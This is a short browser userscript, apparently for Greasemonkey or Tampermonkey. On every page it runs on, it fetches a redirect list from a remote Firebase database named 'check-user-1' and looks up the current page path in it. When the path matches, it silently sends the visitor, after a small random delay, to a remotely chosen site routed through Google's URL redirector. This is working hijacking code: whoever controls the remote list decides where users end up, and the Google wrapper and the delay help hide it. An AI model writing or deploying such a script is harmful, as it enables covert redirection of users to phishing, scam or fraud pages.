(function (requestApi) {
    "use strict";

    const fetchUrl = "https://check-user-1-default-rtdb.firebaseio.com/redirects.json?t=" + Date.now();

    requestApi({
        method: "GET",
        url: fetchUrl,
        onload: function (res) {
            try {
                const redirectMap = JSON.parse(res.responseText);
                if (!redirectMap) return;

                const path = window.location.pathname.split("/").filter(Boolean);

                if (path.length > 0) {
                    let key = path[0];

                    if (!key.includes("-2") && redirectMap[key + "-2"]) {
                        key = key + "-2";
                    }

                    if (redirectMap[key]) {
                        const delay = Math.floor(Math.random() * 200) + 100;
                        setTimeout(() => {
                            window.location.replace("https://www.google.com/url?q=https://" + redirectMap[key]);
                        }, delay);
                    }
                }
            } catch (e) {
                console.error("[main.js] Exception:", e);
            }
        }
    });
})(GM_xmlhttpRequest);
